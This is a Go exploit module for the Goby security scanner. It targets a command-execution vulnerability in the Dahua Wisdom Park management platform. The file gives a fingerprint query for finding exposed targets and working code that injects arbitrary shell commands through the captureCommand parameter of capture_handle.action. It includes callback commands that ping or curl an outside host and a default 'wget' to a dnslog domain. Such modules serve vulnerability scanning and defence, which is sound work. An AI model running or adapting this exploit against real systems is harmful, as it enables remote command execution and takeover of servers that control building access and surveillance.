package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "Dahua Wisdom park System capture_handle.action command execution vulerability",
    "Description": "<p>Dahua wisdom park series integrated management platform is for the general public buildings to provide safe and efficient management and build the wisdom of the zone comprehensive management platform, through the fusion of dahua professional experience in the field of security and intelligent and cutting-edge technology, integrated video, access control, alarm, parking lot, attendance, visitors, visible interphone, information release, and other business subsystems.</p><p>Dahua Wisdom park System capture_handle.action has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Dahua Wisdom park System",
    "Homepage": "http://dahuatech.corp.dav01.com/product/250196/list.html",
    "DisclosureDate": "2022-07-13",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\"",
    "Level": "2",
    "Impact": "<p>Dahua Wisdom park System capture_handle.action has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://dahuatech.corp.dav01.com\">http://dahuatech.corp.dav01.com</a></p><p></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "wget 3sd.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "大华 智慧园区综合管理平台 capture_handle.action 命令执行漏洞",
            "Product": "大华 智慧园区综合管理平台",
            "Description": "<p>大华智慧园区系列综合管理平台是为一般公共建筑提供安全高效的管理，打造智慧园区综合管理平台，通过融合大华在安防领域的专业经验和智能化前沿技术，集成视频、门禁、报警、停车场、考勤、访客、可视对讲机、信息发布等业务子系统。</p><p>大华 智慧园区综合管理平台 capture_handle.action存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://dahuatech.corp.dav01.com\">http://dahuatech.corp.dav01.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>大华 智慧园区综合管理平台 capture_handle.action存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Dahua Wisdom park System capture_handle.action command execution vulerability",
            "Product": "Dahua Wisdom park System",
            "Description": "<p>Dahua wisdom park series integrated management platform is for the general public buildings to provide safe and efficient management and build the wisdom of the zone comprehensive management platform, through the fusion of dahua professional experience in the field of security and intelligent and cutting-edge technology, integrated video, access control, alarm, parking lot, attendance, visitors, visible interphone, information release, and other business subsystems.<br></p><p>Dahua Wisdom park System capture_handle.action has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://dahuatech.corp.dav01.com\">http://dahuatech.corp.dav01.com</a></p><p></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Dahua Wisdom park System capture_handle.action has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/config/asst/system_setPassWordValidate.action/capture_handle.action"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			resp, err := httpclient.DoHttpRequest(u, cfg)
			if err != nil || resp.StatusCode != 200 {
				return false
			}
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			cmd := "ping -c 2 " + checkUrl
			if !isDomain {
				cmd = "curl " + checkUrl
			}
			cmd = url.QueryEscape(cmd)
			uri = "/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=" + cmd
			cfg = httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			_, err = httpclient.DoHttpRequest(u, cfg)
			if err != nil {
				return false
			}
			return godclient.PullExists(checkStr, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/config/asst/system_setPassWordValidate.action/capture_handle.action"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil || resp.StatusCode != 200 {
				return expResult
			}
			cmd := ss.Params["cmd"].(string)
			cmd = url.QueryEscape(cmd)
			uri = "/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=" + cmd
			cfg = httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			_, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			expResult.Success =true
			expResult.Output = "命令执行成功"
			return expResult
		},
	))
}
